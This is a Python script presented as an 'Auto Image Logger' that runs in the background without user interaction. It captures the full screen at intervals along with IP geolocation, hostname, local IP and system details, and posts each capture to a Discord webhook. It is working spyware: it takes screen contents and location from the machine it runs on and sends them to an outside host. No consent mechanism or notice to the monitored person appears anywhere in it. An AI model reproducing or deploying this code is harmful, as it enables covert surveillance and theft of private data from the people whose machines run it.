#!/usr/bin/env python3
"""
Auto Image Logger - Background version
Automatically captures screenshots and location data without user interaction
"""

import os
import sys
import time
import json
import requests
import threading
import signal
from datetime import datetime
from io import BytesIO
from PIL import ImageGrab, Image
from pathlib import Path
from typing import Optional, Dict
import logging
import traceback

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('auto_logger.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)


class AutoImageLogger:
    """
    Auto-capturing image logger that runs in background without user interaction.
    """

    def __init__(self, config_path: str = "auto_config.json"):
        """
        Initialize the auto logger with configuration.

        Args:
            config_path: Path to configuration file
        """
        self.config_path = config_path
        self.config = self.load_config()
        self.running = False
        self.capture_thread = None
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.capture_count = 0

        # Create necessary directories
        self.setup_directories()

        # Setup signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        logger.info(f"Auto Image Logger Initialized - Session: {self.session_id}")
        logger.info(f"Webhook URL: {self.mask_webhook_url(self.config['webhook_url'])}")
        logger.info(f"Capture interval: {self.config['capture_interval']} seconds")
        logger.info(f"Location capture: {'Enabled' if self.config['capture_location'] else 'Disabled'}")

    def mask_webhook_url(self, url: str) -> str:
        """Mask webhook URL for secure logging."""
        if len(url) < 20:
            return "***"
        return f"{url[:10]}...{url[-10:]}"

    def load_config(self) -> Dict:
        """Load or create configuration file for auto mode."""
        default_config = {
            "webhook_url": "",  # MUST be set by user
            "capture_interval": 300,  # 5 minutes by default
            "image_quality": 85,
            "max_captures": 0,  # 0 = unlimited
            "save_locally": True,
            "local_save_path": "auto_captures",
            "compress_images": True,
            "max_image_size_mb": 8,
            "embed_color": 15158332,  # Red color for auto mode
            "include_timestamp": True,
            "include_system_info": True,
            "capture_location": True,
            "location_service": "ipapi",
            "location_timeout": 5,
            "start_delay": 10,  # Seconds before first capture
            "log_level": "INFO",
            "run_forever": True,  # Run until stopped
            "auto_start": True  # Start capturing immediately
        }

        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, 'r') as f:
                    user_config = json.load(f)
                    # Update default config with user values
                    default_config.update(user_config)
            except Exception as e:
                logger.error(f"Error loading config: {e}. Using defaults.")

        # Check if webhook URL is set
        if not default_config['webhook_url']:
            logger.critical("Webhook URL not configured! Please set it in auto_config.json")
            sys.exit(1)

        # Save config for future use
        with open(self.config_path, 'w') as f:
            json.dump(default_config, f, indent=4)

        # Set log level from config
        log_level = getattr(logging, default_config['log_level'].upper(), logging.INFO)
        logging.getLogger().setLevel(log_level)

        return default_config

    def setup_directories(self):
        """Create necessary directories for logging."""
        directories = [
            self.config['local_save_path'],
            "logs",
            "session_logs"
        ]

        for directory in directories:
            Path(directory).mkdir(exist_ok=True)

    def signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully."""
        logger.info(f"Received signal {signum}, shutting down...")
        self.stop()
        sys.exit(0)

    def capture_screenshot(self) -> Optional[Image.Image]:
        """Capture a screenshot."""
        try:
            screenshot = ImageGrab.grab()

            # Convert to RGB if needed
            if screenshot.mode != 'RGB':
                screenshot = screenshot.convert('RGB')

            return screenshot
        except Exception as e:
            logger.error(f"Error capturing screenshot: {e}")
            return None

    def get_location_data(self) -> Dict[str, any]:
        """Get approximate location data using IP geolocation."""
        if not self.config['capture_location']:
            return {"status": "Location capture disabled"}

        services = {
            "ipapi": "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query",
            "ipapi_co": "https://ipapi.co/json/",
            "geolocation": "http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,query"
        }

        service_url = services.get(self.config['location_service'], services["ipapi"])

        try:
            response = requests.get(service_url, timeout=self.config['location_timeout'])

            if response.status_code == 200:
                data = response.json()

                if service_url == services["ipapi"] or service_url == services["geolocation"]:
                    if data.get("status") == "success":
                        return {
                            "status": "success",
                            "latitude": data.get("lat"),
                            "longitude": data.get("lon"),
                            "city": data.get("city"),
                            "region": data.get("regionName"),
                            "country": data.get("country"),
                            "country_code": data.get("countryCode"),
                            "isp": data.get("isp"),
                            "ip": data.get("query"),
                            "service": "ip-api.com"
                        }
                    else:
                        return {"status": f"Service error: {data.get('message', 'Unknown')}"}

                elif service_url == services["ipapi_co"]:
                    return {
                        "status": "success",
                        "latitude": float(data.get("latitude", 0)),
                        "longitude": float(data.get("longitude", 0)),
                        "city": data.get("city"),
                        "region": data.get("region"),
                        "country": data.get("country_name"),
                        "country_code": data.get("country_code"),
                        "isp": data.get("org"),
                        "ip": data.get("ip"),
                        "service": "ipapi.co"
                    }

            return {"status": f"HTTP error: {response.status_code}"}

        except requests.exceptions.Timeout:
            return {"status": "Location service timeout"}
        except requests.exceptions.RequestException as e:
            return {"status": f"Network error: {str(e)}"}
        except Exception as e:
            return {"status": f"Location error: {str(e)}"}

    def get_system_info(self) -> Dict[str, str]:
        """Gather system information."""
        info = {
            "timestamp": datetime.now().isoformat(),
            "platform": sys.platform,
            "python_version": sys.version.split()[0],
            "session_id": self.session_id,
            "capture_number": self.capture_count
        }

        try:
            import platform
            import socket
            import psutil

            info.update({
                "system": platform.system(),
                "release": platform.release(),
                "processor": platform.processor(),
                "hostname": platform.node(),
                "local_ip": socket.gethostbyname(socket.gethostname()),
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage('/').percent
            })
        except ImportError:
            pass
        except Exception:
            pass

        return info

    def create_discord_embed(self, system_info: Dict, location_info: Dict = None) -> Dict:
        """Create Discord embed."""
        embed = {
            "title": "🤖 Auto-Captured Screenshot",
            "color": self.config['embed_color'],
            "fields": [],
            "footer": {
                "text": f"Auto Logger • Session: {self.session_id} • Capture #{self.capture_count}"
            },
            "timestamp": datetime.now().isoformat()
        }

        # Add system info
        if self.config['include_system_info']:
            system_fields = []
            for key, value in system_info.items():
                if key not in ['session_id', 'capture_number']:
                    system_fields.append(f"**{key.replace('_', ' ').title()}:** {value}")

            if system_fields:
                embed["fields"].append({
                    "name": "💻 System Info",
                    "value": "\n".join(system_fields),
                    "inline": False
                })

        # Add location info
        if location_info and self.config['capture_location']:
            if location_info.get('status') == 'success':
                lat = location_info.get('latitude')
                lon = location_info.get('longitude')
                city = location_info.get('city', 'Unknown')
                country = location_info.get('country', 'Unknown')

                google_maps_link = f"https://maps.google.com/?q={lat},{lon}"

                location_text = (
                    f"**📍 {city}, {country}**\n"
                    f"**Coordinates:** {lat:.6f}, {lon:.6f}\n"
                    f"**ISP:** {location_info.get('isp', 'Unknown')}\n"
                    f"**IP:** ||{location_info.get('ip', 'Unknown')}||\n"
                    f"[Google Maps]({google_maps_link})"
                )

                embed["fields"].append({
                    "name": "🌍 Location",
                    "value": location_text,
                    "inline": False
                })

        return embed

    def send_to_discord(self, image_data: BytesIO, filename: str, system_info: Dict, location_info: Dict = None):
        """Send image to Discord webhook."""
        try:
            files = {
                'file': (filename, image_data, 'image/jpeg')
            }

            payload = {
                "username": "Auto Image Logger",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/4712/4712035.png",
                "embeds": [self.create_discord_embed(system_info, location_info)]
            }

            if self.config['include_timestamp']:
                payload["content"] = f"📸 Auto-captured at {datetime.now().strftime('%H:%M:%S')}"

            files['payload_json'] = (None, json.dumps(payload), 'application/json')

            response = requests.post(self.config['webhook_url'], files=files, timeout=30)

            if response.status_code in [200, 204]:
                logger.info(f"Sent to Discord successfully")
            else:
                logger.error(f"Discord error: {response.status_code} - {response.text}")

        except Exception as e:
            logger.error(f"Error sending to Discord: {e}")

    def save_locally(self, image: Image.Image) -> Optional[str]:
        """Save screenshot locally."""
        if not self.config['save_locally']:
            return None

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"auto_{self.session_id}_{self.capture_count:06d}_{timestamp}.jpg"
        filepath = os.path.join(self.config['local_save_path'], filename)

        try:
            image.save(filepath, format='JPEG', quality=self.config['image_quality'], optimize=True)
            logger.debug(f"Saved locally: {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Error saving locally: {e}")
            return None

    def compress_image(self, image: Image.Image, max_size_mb: float = 8) -> BytesIO:
        """Compress image for Discord."""
        output = BytesIO()
        quality = self.config['image_quality']

        image.save(output, format='JPEG', quality=quality, optimize=True)

        # Reduce quality if too large
        while output.tell() > max_size_mb * 1024 * 1024 and quality > 10:
            quality -= 10
            output = BytesIO()
            image.save(output, format='JPEG', quality=quality, optimize=True)

        output.seek(0)
        return output

    def capture_and_process(self):
        """Main capture and processing function."""
        logger.info(f"Capture #{self.capture_count}")

        try:
            # Capture screenshot
            screenshot = self.capture_screenshot()
            if not screenshot:
                logger.warning("Failed to capture screenshot, skipping...")
                return

            # Get system info
            system_info = self.get_system_info()

            # Get location data
            location_info = None
            if self.config['capture_location']:
                location_info = self.get_location_data()
                if location_info.get('status') == 'success':
                    logger.info(
                        f"Location: {location_info.get('city', 'Unknown')}, {location_info.get('country', 'Unknown')}")

            # Save locally
            self.save_locally(screenshot)

            # Prepare and send to Discord
            image_data = self.compress_image(screenshot, self.config['max_image_size_mb'])
            filename = f"auto_{self.session_id}_{self.capture_count:06d}.jpg"
            self.send_to_discord(image_data, filename, system_info, location_info)

            image_data.close()
            self.capture_count += 1

            # Log status periodically
            if self.capture_count % 10 == 0:
                logger.info(f"Status: {self.capture_count} captures completed")

        except Exception as e:
            logger.error(f"Error in capture_and_process: {e}")
            logger.error(traceback.format_exc())

    def start_capture_loop(self):
        """Start the automated capture loop."""
        logger.info(f"Starting capture loop with {self.config['capture_interval']}s interval")

        # Initial delay
        if self.config['start_delay'] > 0:
            logger.info(f"Waiting {self.config['start_delay']} seconds before first capture...")
            time.sleep(self.config['start_delay'])

        while self.running:
            try:
                self.capture_and_process()

                # Check if we've reached max captures
                if self.config['max_captures'] > 0 and self.capture_count >= self.config['max_captures']:
                    logger.info(f"Reached maximum captures ({self.config['max_captures']}), stopping...")
                    self.stop()
                    break

                # Wait for next capture
                time.sleep(self.config['capture_interval'])

            except KeyboardInterrupt:
                logger.info("Capture loop interrupted")
                self.stop()
                break
            except Exception as e:
                logger.error(f"Error in capture loop: {e}")
                # Continue running despite errors
                time.sleep(60)  # Wait a minute before retrying

    def start(self):
        """Start the auto logger."""
        if self.running:
            logger.warning("Logger is already running")
            return

        self.running = True

        # Save session info
        session_info = {
            "session_id": self.session_id,
            "start_time": datetime.now().isoformat(),
            "config": self.config
        }

        with open(f"session_logs/session_{self.session_id}.json", 'w') as f:
            json.dump(session_info, f, indent=4)

        # Start capture thread
        self.capture_thread = threading.Thread(target=self.start_capture_loop)
        self.capture_thread.daemon = True
        self.capture_thread.start()

        logger.info("✅ Auto logger started")

        # Keep main thread alive
        while self.running:
            time.sleep(1)

    def stop(self):
        """Stop the auto logger."""
        self.running = False

        # Save session end info
        session_end_info = {
            "session_id": self.session_id,
            "end_time": datetime.now().isoformat(),
            "total_captures": self.capture_count
        }

        with open(f"session_logs/session_{self.session_id}_end.json", 'w') as f:
            json.dump(session_end_info, f, indent=4)

        if self.capture_thread:
            self.capture_thread.join(timeout=10)

        logger.info("🛑 Auto logger stopped")


def check_dependencies():
    """Check and install required dependencies."""
    try:
        import requests
        from PIL import ImageGrab
        import psutil
        logger.info("All dependencies are installed")
        return True
    except ImportError as e:
        logger.error(f"Missing dependency: {e}")

        print("Installing required dependencies...")
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "pillow", "psutil"])
            print("Dependencies installed. Please restart the program.")
            return False
        except Exception as install_error:
            logger.error(f"Failed to install dependencies: {install_error}")
            return False


def main():
    """Main function for auto mode."""
    print("=" * 60)
    print("🤖 AUTO IMAGE LOGGER - BACKGROUND MODE")
    print("=" * 60)
    print("This version runs automatically without user interaction.")
    print("Use Ctrl+C to stop the program.")
    print("Logs are saved to auto_logger.log")
    print()

    # Check dependencies
    if not check_dependencies():
        sys.exit(1)

    # Check if config exists, create if not
    config_file = "auto_config.json"
    if not os.path.exists(config_file):
        print(f"\n⚠️  Config file '{config_file}' not found.")
        print("Creating default configuration...")

        default_config = {
            "webhook_url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
            "capture_interval": 300,
            "image_quality": 85,
            "max_captures": 0,
            "save_locally": True,
            "local_save_path": "auto_captures",
            "compress_images": True,
            "max_image_size_mb": 8,
            "embed_color": 15158332,
            "include_timestamp": True,
            "include_system_info": True,
            "capture_location": True,
            "location_service": "ipapi",
            "location_timeout": 5,
            "start_delay": 10,
            "log_level": "INFO",
            "run_forever": True,
            "auto_start": True
        }

        with open(config_file, 'w') as f:
            json.dump(default_config, f, indent=4)

        print(f"✅ Created {config_file}")
        print("⚠️  Please edit this file and set your Discord webhook URL!")
        print(f"   Then run the program again.")
        sys.exit(1)

    # Start the auto logger
    logger = AutoImageLogger(config_file)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
        print("\nProgram stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        logger.error(traceback.format_exc())
        sys.exit(1)


if __name__ == "__main__":
    main()
